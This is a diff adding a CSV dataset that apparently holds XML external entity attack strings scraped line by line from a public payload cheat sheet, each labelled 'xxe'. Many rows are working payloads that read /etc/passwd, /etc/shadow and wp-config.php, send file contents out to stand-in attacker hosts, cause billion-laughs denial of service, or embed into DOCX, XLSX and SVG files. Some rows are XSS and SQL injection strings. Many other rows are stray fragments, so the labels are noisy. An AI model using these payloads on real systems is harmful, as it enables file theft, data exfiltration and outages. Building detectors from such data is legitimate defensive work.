@@ -1,0 +1,332 @@
+payload,label,source
+"- A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)",xxe,payloads_all_the_things
+- PoC tool (based on wrapwrap & lightyear ) to demonstrate XXE in PHP with only LIBXML_DTDLOAD or LIBXML_DTDATTR flag set,xxe,payloads_all_the_things
+"<!ENTITY entity_name ""entity_value"">",xxe,payloads_all_the_things
+SYSTEM,xxe,payloads_all_the_things
+"<!ENTITY entity_name SYSTEM ""entity_value"">",xxe,payloads_all_the_things
+DOCTYPE,xxe,payloads_all_the_things
+"<!--?xml version=""1.0"" ?-->",xxe,payloads_all_the_things
+"<!DOCTYPE replace [<!ENTITY example ""Doe""> ]>",xxe,payloads_all_the_things
+<userInfo>,xxe,payloads_all_the_things
+<firstName>John</firstName>,xxe,payloads_all_the_things
+<lastName>&example;</lastName>,xxe,payloads_all_the_things
+</userInfo>,xxe,payloads_all_the_things
+Content-Type: application/xml,xxe,payloads_all_the_things
+&name;,xxe,payloads_all_the_things
+%name;,xxe,payloads_all_the_things
+"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?>",xxe,payloads_all_the_things
+<!DOCTYPE data [,xxe,payloads_all_the_things
+<!ELEMENT data (#ANY)>,xxe,payloads_all_the_things
+"<!ENTITY file SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
+]>,xxe,payloads_all_the_things
+<data>&file;</data>,xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",xxe,payloads_all_the_things
+<!DOCTYPE foo [,xxe,payloads_all_the_things
+<!ELEMENT foo ANY >,xxe,payloads_all_the_things
+"<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<!ENTITY % xxe PUBLIC ""Random Text"" ""URL"">",xxe,payloads_all_the_things
+"<!ENTITY xxe PUBLIC ""Any TEXT"" ""URL"">",xxe,payloads_all_the_things
+"<!DOCTYPE test [ <!ENTITY % init SYSTEM ""data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk""> %init; ]><foo/>",xxe,payloads_all_the_things
+"<!DOCTYPE replace [<!ENTITY xxe SYSTEM ""php://filter/convert.base64-encode/resource=index.php""> ]>",xxe,payloads_all_the_things
+<contacts>,xxe,payloads_all_the_things
+<contact>,xxe,payloads_all_the_things
+<name>Jean &xxe; Dupont</name>,xxe,payloads_all_the_things
+<phone>00 11 22 33 44</phone>,xxe,payloads_all_the_things
+<address>42 rue du CTF</address>,xxe,payloads_all_the_things
+<zipcode>75000</zipcode>,xxe,payloads_all_the_things
+<city>Paris</city>,xxe,payloads_all_the_things
+</contact>,xxe,payloads_all_the_things
+</contacts>,xxe,payloads_all_the_things
+"<!ENTITY % xxe SYSTEM ""php://filter/convert.base64-encode/resource=http://10.0.0.3"" >",xxe,payloads_all_the_things
+<foo>&xxe;</foo>,xxe,payloads_all_the_things
+"<foo xmlns:xi=""http://www.w3.org/2001/XInclude"">",xxe,payloads_all_the_things
+"<xi:include parse=""text"" href=""file:///etc/passwd""/></foo>",xxe,payloads_all_the_things
+"<!ENTITY xxe SYSTEM ""http://internal.service/secret_pass.txt"" >",xxe,payloads_all_the_things
+"<!ENTITY a0 ""dos"" >",xxe,payloads_all_the_things
+"<!ENTITY a1 ""&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;"">",xxe,payloads_all_the_things
+"<!ENTITY a2 ""&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;"">",xxe,payloads_all_the_things
+"<!ENTITY a3 ""&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;"">",xxe,payloads_all_the_things
+"<!ENTITY a4 ""&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;"">",xxe,payloads_all_the_things
+<data>&a4;</data>,xxe,payloads_all_the_things
+"a: &a [""lol"",""lol"",""lol"",""lol"",""lol"",""lol"",""lol"",""lol"",""lol""]",xxe,payloads_all_the_things
+"b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]",xxe,payloads_all_the_things
+"c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]",xxe,payloads_all_the_things
+"d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",xxe,payloads_all_the_things
+"e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]",xxe,payloads_all_the_things
+"f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]",xxe,payloads_all_the_things
+"g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]",xxe,payloads_all_the_things
+"h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]",xxe,payloads_all_the_things
+"i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]",xxe,payloads_all_the_things
+<!DOCTYPE r [,xxe,payloads_all_the_things
+"<!ENTITY % pe_1 ""<!---->"">",xxe,payloads_all_the_things
+"<!ENTITY % pe_2 ""&#37;pe_1;<!---->&#37;pe_1;"">",xxe,payloads_all_the_things
+"<!ENTITY % pe_3 ""&#37;pe_2;<!---->&#37;pe_2;"">",xxe,payloads_all_the_things
+"<!ENTITY % pe_4 ""&#37;pe_3;<!---->&#37;pe_3;"">",xxe,payloads_all_the_things
+%pe_4;,xxe,payloads_all_the_things
+<r/>,xxe,payloads_all_the_things
+<!DOCTYPE root [,xxe,payloads_all_the_things
+"<!ENTITY % local_dtd SYSTEM ""file:///abcxyz/"">",xxe,payloads_all_the_things
+%local_dtd;,xxe,payloads_all_the_things
+<root></root>,xxe,payloads_all_the_things
+/usr/share/xml/fontconfig/fonts.dtd,xxe,payloads_all_the_things
+/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd,xxe,payloads_all_the_things
+/usr/share/xml/svg/svg10.dtd,xxe,payloads_all_the_things
+/usr/share/xml/svg/svg11.dtd,xxe,payloads_all_the_things
+/usr/share/yelp/dtd/docbookx.dtd,xxe,payloads_all_the_things
+%constant,xxe,payloads_all_the_things
+<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>,xxe,payloads_all_the_things
+<!DOCTYPE message [,xxe,payloads_all_the_things
+"<!ENTITY % local_dtd SYSTEM ""file:///usr/share/xml/fontconfig/fonts.dtd"">",xxe,payloads_all_the_things
+<!ENTITY % constant 'aaa)>,xxe,payloads_all_the_things
+"<!ENTITY &#x25; file SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
+"<!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>"">",xxe,payloads_all_the_things
+&#x25;eval;,xxe,payloads_all_the_things
+&#x25;error;,xxe,payloads_all_the_things
+<!ELEMENT aa (bb'>,xxe,payloads_all_the_things
+<message>Text</message>,xxe,payloads_all_the_things
+"<!ENTITY % local_dtd SYSTEM ""file:///C:\Windows\System32\wbem\xml\cim20.dtd"">",xxe,payloads_all_the_things
+<!ENTITY % SuperClass '>,xxe,payloads_all_the_things
+"<!ENTITY &#x25; file SYSTEM ""file://D:\webserv2\services\web.config"">",xxe,payloads_all_the_things
+"<!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>"">",xxe,payloads_all_the_things
+"<!ENTITY test ""test""'",xxe,payloads_all_the_things
+]><xxx>anything</xxx>,xxe,payloads_all_the_things
+"<!ENTITY &#x25; file SYSTEM ""https://erp.company.com"">",xxe,payloads_all_the_things
+"<!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>"">",xxe,payloads_all_the_things
+"<?xml version=""1.0"" ?>",xxe,payloads_all_the_things
+"<!ENTITY % ext SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/ext.dtd"">",xxe,payloads_all_the_things
+%ext;,xxe,payloads_all_the_things
+<message></message>,xxe,payloads_all_the_things
+"<!ENTITY % file SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
+"<!ENTITY % eval ""<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"">",xxe,payloads_all_the_things
+%eval;,xxe,payloads_all_the_things
+%error;,xxe,payloads_all_the_things
+"<!ENTITY % data SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
+"<!ENTITY % eval ""<!ENTITY &#x25; leak SYSTEM '%data;:///'>"">",xxe,payloads_all_the_things
+%leak;,xxe,payloads_all_the_things
+&#x25;,xxe,payloads_all_the_things
+"<!ENTITY % ext SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/x""> %ext;",xxe,payloads_all_the_things
+<r></r>,xxe,payloads_all_the_things
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>,xxe,payloads_all_the_things
+<root>&test;</root>,xxe,payloads_all_the_things
+http://[ATTACKER.DOMAIN.TLD],xxe,payloads_all_the_things
+"<!ENTITY % xxe SYSTEM ""file:///etc/passwd"" >",xxe,payloads_all_the_things
+"<!ENTITY callhome SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/?%xxe;"">",xxe,payloads_all_the_things
+<foo>&callhome;</foo>,xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""utf-8""?>",xxe,payloads_all_the_things
+"<!DOCTYPE data SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd"">",xxe,payloads_all_the_things
+<data>&send;</data>,xxe,payloads_all_the_things
+File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd,xxe,payloads_all_the_things
+"<!ENTITY % file SYSTEM ""file:///sys/power/image_size"">",xxe,payloads_all_the_things
+"<!ENTITY % all ""<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>"">",xxe,payloads_all_the_things
+%all;,xxe,payloads_all_the_things
+<!ELEMENT r ANY >,xxe,payloads_all_the_things
+"<!ENTITY % sp SYSTEM ""http://10.10.10.10/dtd.xml"">",xxe,payloads_all_the_things
+%sp;,xxe,payloads_all_the_things
+%param1;,xxe,payloads_all_the_things
+<r>&exfil;</r>,xxe,payloads_all_the_things
+File stored on http://10.10.10.10/dtd.xml,xxe,payloads_all_the_things
+"<!ENTITY % data SYSTEM ""php://filter/convert.base64-encode/resource=/etc/passwd"">",xxe,payloads_all_the_things
+"<!ENTITY % param1 ""<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>"">",xxe,payloads_all_the_things
+Apache Karaf <= 4.2.1,xxe,payloads_all_the_things
+Apache Karaf <= 4.1.6,xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""UTF-8""?>",xxe,payloads_all_the_things
+"<!DOCTYPE doc [<!ENTITY % dtd SYSTEM ""http://[ATTACKER.DOMAIN.TLD]""> %dtd;]",xxe,payloads_all_the_things
+"<features name=""my-features"" xmlns=""http://karaf.apache.org/xmlns/features/v1.3.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""",xxe,payloads_all_the_things
+"xsi:schemaLocation=""http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0"">",xxe,payloads_all_the_things
+"<feature name=""deployer"" version=""2.0"" install=""auto"">",xxe,payloads_all_the_things
+</feature>,xxe,payloads_all_the_things
+</features>,xxe,payloads_all_the_things
+Content-Type: text/xml; charset=utf-8,xxe,payloads_all_the_things
+HTTP Content Type: `Content-Type: text/xml; charset=utf-8`,xxe,payloads_all_the_things
+Reading Byte Order Mark (BOM),xxe,payloads_all_the_things
+UTF-8 (3C 3F 78 6D),xxe,payloads_all_the_things
+UTF-16BE (00 3C 00 3F),xxe,payloads_all_the_things
+UTF-16LE (3C 00 3F 00),xxe,payloads_all_the_things
+"XML declaration: `<?xml version=""1.0"" encoding=""UTF-8""?>`",xxe,payloads_all_the_things
+cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml,xxe,payloads_all_the_things
+application/json,xxe,payloads_all_the_things
+"{""search"":""name"",""value"":""test""}",xxe,payloads_all_the_things
+application/xml,xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""UTF-8"" ?><root><search>name</search><value>data</value></root>",xxe,payloads_all_the_things
+<root>,xxe,payloads_all_the_things
+XML documents must contain one root (`<root>`) element that is the parent of all other elements.,xxe,payloads_all_the_things
+"""errors"":{",xxe,payloads_all_the_things
+"""errorMessage"":""org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.""",xxe,payloads_all_the_things
+"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",xxe,payloads_all_the_things
+"<image xlink:href=""expect://ls"" width=""200"" height=""200""></image>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" standalone=""yes""?>",xxe,payloads_all_the_things
+"<!DOCTYPE test [ <!ENTITY xxe SYSTEM ""file:///etc/hostname"" > ]>",xxe,payloads_all_the_things
+"<svg width=""128px"" height=""128px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1"">",xxe,payloads_all_the_things
+"<text font-size=""16"" x=""0"" y=""16"">&xxe;</text>",xxe,payloads_all_the_things
+<!DOCTYPE svg [,xxe,payloads_all_the_things
+<!ELEMENT svg ANY >,xxe,payloads_all_the_things
+"<!ENTITY % sp SYSTEM ""http://10.10.10.10:8080/xxe.xml"">",xxe,payloads_all_the_things
+"<svg viewBox=""0 0 200 200"" version=""1.2"" xmlns=""http://www.w3.org/2000/svg"" style=""fill:red"">",xxe,payloads_all_the_things
+"<text x=""15"" y=""100"" style=""fill:black"">XXE via SVG rasterization</text>",xxe,payloads_all_the_things
+"<rect x=""0"" y=""0"" rx=""10"" ry=""10"" width=""200"" height=""200"" style=""fill:pink;opacity:0.7""/>",xxe,payloads_all_the_things
+"<flowRoot font-size=""15"">",xxe,payloads_all_the_things
+<flowRegion>,xxe,payloads_all_the_things
+"<rect x=""0"" y=""0"" width=""200"" height=""200"" style=""fill:red;opacity:0.3""/>",xxe,payloads_all_the_things
+</flowRegion>,xxe,payloads_all_the_things
+<flowDiv>,xxe,payloads_all_the_things
+<flowPara>&exfil;</flowPara>,xxe,payloads_all_the_things
+</flowDiv>,xxe,payloads_all_the_things
+</flowRoot>,xxe,payloads_all_the_things
+"<!ENTITY % data SYSTEM ""php://filter/convert.base64-encode/resource=/etc/hostname"">",xxe,payloads_all_the_things
+"<!ENTITY % param1 ""<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>"">",xxe,payloads_all_the_things
+<soap:Body>,xxe,payloads_all_the_things
+<foo>,xxe,payloads_all_the_things
+"<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM ""http://10.10.10.10:22/""> %dtd;]><xxx/>]]>",xxe,payloads_all_the_things
+</foo>,xxe,payloads_all_the_things
+</soap:Body>,xxe,payloads_all_the_things
+/_rels/.rels,xxe,payloads_all_the_things
+[Content_Types].xml,xxe,payloads_all_the_things
+/word/document.xml,xxe,payloads_all_the_things
+/ppt/presentation.xml,xxe,payloads_all_the_things
+/xl/workbook.xml,xxe,payloads_all_the_things
+zip -u xxe.docx [Content_Types].xml,xxe,payloads_all_the_things
+DOCX/XLSX/PPTX,xxe,payloads_all_the_things
+ODT/ODG/ODP/ODS,xxe,payloads_all_the_things
+SVG,xxe,payloads_all_the_things
+XML,xxe,payloads_all_the_things
+PDF (experimental),xxe,payloads_all_the_things
+JPG (experimental),xxe,payloads_all_the_things
+GIF (experimental),xxe,payloads_all_the_things
+$ 7z l xxe.xlsx,xxe,payloads_all_the_things
+[...],xxe,payloads_all_the_things
+Date      Time    Attr         Size   Compressed  Name,xxe,payloads_all_the_things
+------------------- ----- ------------ ------------  ------------------------,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....          578          223  _rels/.rels,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....          887          508  xl/workbook.xml,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....         4451          643  xl/styles.xml,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....          731          352  docProps/core.xml,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....          410          246  docProps/app.xml,xxe,payloads_all_the_things
+2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml,xxe,payloads_all_the_things
+2021-10-17 15:19:00              11216         3586  9 files,xxe,payloads_all_the_things
+cd XXE,xxe,payloads_all_the_things
+zip -r -u ../xxe.xlsx *,xxe,payloads_all_the_things
+Microsoft Excel 2007+,xxe,payloads_all_the_things
+xl/workbook.xml,xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>",xxe,payloads_all_the_things
+"<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM ""http://10.10.10.10:8000/xxe.dtd"">%asd;%c;]>",xxe,payloads_all_the_things
+<cdl>&rrr;</cdl>,xxe,payloads_all_the_things
+"<workbook xmlns=""http://schemas.openxmlformats.org/spreadsheetml/2006/main"" xmlns:r=""http://schemas.openxmlformats.org/officeDocument/2006/relationships"">",xxe,payloads_all_the_things
+xl/sharedStrings.xml,xxe,payloads_all_the_things
+"<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM ""http://10.10.10.10:8000/xxe.dtd"">%asd;%c;]>",xxe,payloads_all_the_things
+"<sst xmlns=""http://schemas.openxmlformats.org/spreadsheetml/2006/main"" count=""10"" uniqueCount=""10""><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",xxe,payloads_all_the_things
+"<!ENTITY % d SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
+"<!ENTITY % c ""<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>"">",xxe,payloads_all_the_things
+xxeserv -o files.log -p 2121 -w -wd public -wp 8000,xxe,payloads_all_the_things
+<!-- Load the contents of a sensitive file into a variable -->,xxe,payloads_all_the_things
+"<!ENTITY % payload SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
+<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->,xxe,payloads_all_the_things
+"<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/x=%payload;"">'>",xxe,payloads_all_the_things
+%external;,xxe,payloads_all_the_things
+_Processing),xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM ""file:///etc/passwd""> ]>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM ""file:///c:/boot.ini""> ]>",xxe,payloads_all_the_things
+"<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM ""http://crowdshield.com/.testing/rfi_vuln.txt""> ]>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?><change-log><text>Hello World</text></change-log>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?><change-log><text>&quot;Hello World&quot;</text></change-log>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?><!DOCTYPE change-log[ <!ENTITY myEntity ""World""> ]><change-log><text>Hello &myEntity;</text></change-log>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?><!DOCTYPE change-log[ <!ENTITY myEntity ""World""><!ENTITY myQuote ""&quot;""> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>",xxe,payloads_all_the_things
+"<!ENTITY systemEntity SYSTEM ""robots.txt"">",xxe,payloads_all_the_things
+<change-log> <text>&systemEntity;</text> </change-log>,xxe,payloads_all_the_things
+"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""robots.txt""> ]> <change-log> <text>&systemEntity;</text> </change-log>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""../../../../boot.ini""> ]> <change-log> <text>&systemEntity;</text> </change-log>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""robots.txt""> ]> <change-log> <text>&systemEntity;</text>; </change-log>",xxe,payloads_all_the_things
+<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>,xxe,payloads_all_the_things
+"<?xml version=""1.0""?><change-log><text><script>alert(1)</script></text></change-log>",xxe,payloads_all_the_things
+count(/child::node()),xxe,payloads_all_the_things
+x' or name()='username' or 'x'='y,xxe,payloads_all_the_things
+"<name>','')); phpinfo(); exit;/*</name>",xxe,payloads_all_the_things
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,xxe,payloads_all_the_things
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""https://crowdshield.com/.testing/rfi_vuln.txt"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""http://xerosecurity.com/.testing/rfi_vuln.txt"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>""",xxe,payloads_all_the_things
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",xxe,payloads_all_the_things
+"<xml SRC=""https://crowdshield.com/.testing/rfi_vuln.txt"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>""",xxe,payloads_all_the_things
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""https://crowdshield.com/.testing/xss.html""><xss:xss>XSS</xss:xss></HTML>",xxe,payloads_all_the_things
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",xxe,payloads_all_the_things
+"<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
+"<xml SRC=""https://crowdshield.com/.testing/xss.html"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
+"<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM ""https://crowdshield.com/.testing/rfi_vuln.txt"">%f5a30; ]>",xxe,payloads_all_the_things
+"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""../../../boot.ini"" ]> <change-log> <text>&systemEntity;</text>; </change-log>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""utf-8""?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM ""php://filter/read-convert.base64-encode/resource=file:///C:/boot.ini"" >]><doc><test>Contents of file: &xxe;</test></doc>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM ""https://crowdshield.com/.testing/rfi.txt"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"""}}</script><script>alert(1);</script></body></html><!--",xxe,payloads_all_the_things
+"}}</script>'""",xxe,payloads_all_the_things
+}}</script>',xxe,payloads_all_the_things
+'}}</script>',xxe,payloads_all_the_things
+"'}}</script>""",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""utf-16"" standalone=""yes""?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://xerosecurity.com</string></value></param></params></methodCall>",xxe,payloads_all_the_things
+"<xml version=""1.0""?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM ""../../../../../../../etc/passwd"">]><methodCall><methodName>&xxe</methodName></methodCall>",xxe,payloads_all_the_things
+"<xml version=""1.0""?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM ""http://xerosecurity.com/.testing/rfi_vuln.txt"">]><methodCall><methodName>&xxe</methodName></methodCall>",xxe,payloads_all_the_things
+"<xml version=""1.0""?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM ""https://crowdshield.com/.testing/rfi_vuln.txt"">]><methodCall><methodName>&xxe</methodName></methodCall>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xxe,payloads_all_the_things
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""utf-8""?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM ""php://filter/read-convert.base64-encode/resource=file:///C:/htdocs/wordpress/wp-config.php"" >]><doc><test>Contents of file: &xxe;</test></doc>",xxe,payloads_all_the_things
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo><?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"">]><foo>&xxe;</foo>",xxe,payloads_all_the_things
